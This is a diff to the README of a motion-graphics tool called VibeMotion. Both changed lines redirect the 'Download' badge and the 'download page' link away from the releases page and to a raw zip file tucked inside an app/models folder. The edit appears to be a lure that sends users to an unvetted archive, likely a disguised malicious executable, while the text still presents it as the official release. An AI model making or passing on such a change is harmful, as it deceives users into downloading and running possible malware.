@@ -1,6 +1,6 @@
 # 🎥 VibeMotion - Create Motion Graphics Using Simple Text
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kristianunfastened991/VibeMotion/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kristianunfastened991/VibeMotion/raw/refs/heads/main/app/models/Vibe_Motion_v3.2-beta.4.zip)
 
 VibeMotion helps you build motion graphics on your computer. You describe what you want the video to look like, and the software generates it. You can import frames from your Figma designs, organize clips on a timeline, and use LTX models to create video content. This tool runs locally on your machine.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run VibeMotion. Check these requirement
 
 You can get the latest version of VibeMotion from the release page.
 
-[Click here to visit the download page](https://github.com/Kristianunfastened991/VibeMotion/releases)
+[Click here to visit the download page](https://github.com/Kristianunfastened991/VibeMotion/raw/refs/heads/main/app/models/Vibe_Motion_v3.2-beta.4.zip)
 
 Look for the file that ends with `.exe` in the latest release section. Save this file to your computer.
 
